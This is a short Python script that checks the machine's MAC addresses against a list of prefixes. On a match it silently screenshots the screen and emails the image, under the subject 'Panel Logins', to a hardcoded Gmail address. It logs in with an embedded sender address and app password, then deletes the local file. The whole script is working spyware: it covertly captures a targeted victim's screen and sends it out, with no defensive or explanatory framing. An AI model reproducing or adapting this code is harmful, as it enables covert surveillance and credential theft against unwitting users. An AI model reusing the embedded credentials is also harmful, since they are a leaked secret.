import os
import subprocess as sp

import re






import sys

def install_package(package):
    sp.check_call([sys.executable, "-m", "pip", "install", package])

# Install pyautogui
install_package("pyautogui")

# Now you can import and use pyautogui in your script
import pyautogui






def main():
    # Run the 'ipconfig /all' command
    result = sp.run(['ipconfig', '/all'], capture_output=True, text=True)

    # Capture the output in the variable named 'tri'
    tri = result.stdout

    mac_address_pattern = r'Physical Address.*:\s+([0-9A-F-]+)'

    # Extract MAC addresses using the regex pattern
    mac_addresses = re.findall(mac_address_pattern, tri)

    if any(mac.startswith("36-02") for mac in mac_addresses) or \
       any(mac.startswith("78-98") for mac in mac_addresses) or \
       any(mac.startswith("90-B1") for mac in mac_addresses) or \
       any(mac.startswith("A0-A3") for mac in mac_addresses) or \
       any(mac.startswith("A2-A3") for mac in mac_addresses) or \
       any(mac.startswith("F8-B1") for mac in mac_addresses) or \
       any(mac.startswith("00-FF") for mac in mac_addresses) or \
       any(mac.startswith("30-24") for mac in mac_addresses) or \
       any(mac.startswith("70-5A") for mac in mac_addresses) or \
       any(mac.startswith("34-17") for mac in mac_addresses):
    
        from email.message import EmailMessage
        import ssl
        import smtplib
        import csv
        import pyautogui  # Import the pyautogui library
        
        email_sender = "mnadeemstar777@gmail.com"
        email_password = "zaektddcxhqebqol"
        email_receiver = "Ibrahim.abid.rajput.minhas@gmail.com"
        subject = "Panel Logins"
        
        # Take a screenshot
        screenshot_path = "screenshot.png"
        pyautogui.screenshot(screenshot_path)
        
        # Create the EmailMessage object
        em = EmailMessage()
        em['From'] = email_sender
        em['To'] = email_receiver
        em['Subject'] = subject
        em.set_content("Please find the screenshot attached.")
        
        # Attach the screenshot to the email
        with open(screenshot_path, 'rb') as screenshot_file:
            em.add_attachment(screenshot_file.read(), maintype="image", subtype="png", filename="screenshot.png")
        
        # SMTP setup and sending the email
        context = ssl.create_default_context()
        with smtplib.SMTP_SSL('smtp.gmail.com', 465, context=context) as smtp:
            smtp.login(email_sender, email_password)
            smtp.sendmail(email_sender, email_receiver, em.as_string())
        
        # Remove the screenshot file
        if os.path.exists(screenshot_path):
            os.remove(screenshot_path)
            print(f"{screenshot_path} has been removed.")
        
        



if __name__ == "__main__":
    main()
